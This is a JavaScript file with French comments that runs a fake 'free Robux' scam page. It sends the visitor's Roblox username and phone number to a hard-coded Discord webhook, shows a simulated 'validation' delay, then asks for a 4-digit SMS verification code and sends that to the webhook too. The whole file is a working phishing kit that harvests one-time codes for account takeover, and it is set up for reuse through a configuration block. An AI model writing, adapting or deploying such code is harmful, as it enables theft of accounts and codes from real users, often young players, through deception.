document.addEventListener('DOMContentLoaded', () => {
  const robuxForm = document.getElementById('robuxForm');
  const otpForm = document.getElementById('otpForm');
  const errorEl = document.getElementById('error-message');
  const statusEl = document.getElementById('status');
  const statusMessageEl = document.getElementById('status-message');

  // --- CONFIGURATION ---
  // 1. Mets ton URL de webhook Discord ici
  const webhookUrl = 'https://discord.com/api/webhooks/1471781365644001350/3epbX7ZLiMTJ69n8DmQyE8KOYYzCkqzAjo778oEaA_eipDhi-qXYt2Xj1eyBq-1hXfzq';
  // 2. Mets l'adresse de ton site ici (ex: https://mon-site.com)
  const siteUrl = 'https://TON_DOMAINE';
  // --------------------

  // Fonction pour envoyer les données à Discord
  const sendToDiscord = async (data) => {
    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      if (!response.ok) throw new Error(`Erreur Discord: ${response.status}`);
    } catch (error) {
      console.error('Erreur lors de l\'envoi à Discord:', error);
      throw error;
    }
  };

  // Gestion du formulaire initial
  if (robuxForm) {
    robuxForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const robux = document.getElementById('robux').value;
      const phone = document.getElementById('phone').value.trim();

      if (!username || !robux || !phone) {
        errorEl.textContent = "Veuillez remplir tous les champs.";
        errorEl.style.color = 'red';
        return;
      }

      try {
        // Envoie la demande à Discord
        const payload = {
          content: `📩 **Nouvelle demande de Robux**`,
          embeds: [{
            title: 'Demande en attente',
            description: `Un utilisateur a demandé des Robux. Vérifiez les détails ci-dessous.`,
            color: 15105570,
            fields: [
              { name: 'Pseudo Roblox', value: username, inline: true },
              { name: 'Robux demandés', value: robux, inline: true },
              { name: 'Numéro de téléphone', value: phone, inline: true }
            ],
            footer: { text: `Demande créée le ${new Date().toLocaleString()}` }
          }]
        };

        await sendToDiscord(payload);

        // Stocke les données en session pour la suite
        sessionStorage.setItem('robuxUsername', username);
        sessionStorage.setItem('robuxAmount', robux);
        sessionStorage.setItem('robuxPhone', phone);

        // Redirige vers la page d'attente
        window.location.href = 'waiting.html';

      } catch (error) {
        errorEl.textContent = "Erreur lors de l'envoi. Vérifiez votre connexion.";
        errorEl.style.color = 'red';
      }
    });
  }

  // Gestion de la page d'attente (waiting.html)
  if (statusEl) {
    // Simule un délai pour l'attente
    setTimeout(() => {
      statusEl.textContent = "✅ Validation réussie. Redirection...";
      statusEl.style.color = 'green';
      setTimeout(() => {
        window.location.href = 'otp.html';
      }, 1500);
    }, 3000);
  }

  // Gestion du formulaire OTP
  if (otpForm) {
    otpForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Récupère les 4 chiffres
      const inputs = document.querySelectorAll('.otp-inputs input');
      const code = Array.from(inputs).map(input => input.value).join('');

      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
        statusMessageEl.textContent = "Veuillez entrer un code de 4 chiffres.";
        statusMessageEl.style.color = 'red';
        return;
      }

      // Récupère les données de la session
      const username = sessionStorage.getItem('robuxUsername');
      const robux = sessionStorage.getItem('robuxAmount');
      const phone = sessionStorage.getItem('robuxPhone');

      try {
        // Envoie le code à Discord
        const payload = {
          content: `✅ **Code SMS reçu**`,
          embeds: [{
            title: 'Validation terminée',
            description: `L'utilisateur a entré le code SMS. La demande est complète.`,
            color: 15105570,
            fields: [
              { name: 'Pseudo Roblox', value: username, inline: true },
              { name: 'Robux demandés', value: robux, inline: true },
              { name: 'Numéro de téléphone', value: phone, inline: true },
              { name: 'Code SMS', value: code, inline: true }
            ],
            footer: { text: `Code reçu le ${new Date().toLocaleString()}` }
          }]
        };

        await sendToDiscord(payload);

        // Redirige vers la page de succès
        window.location.href = 'success.html';

      } catch (error) {
        statusMessageEl.textContent = "Erreur lors de l'envoi. Veuillez réessayer.";
        statusMessageEl.style.color = 'red';
      }
    });
  }
});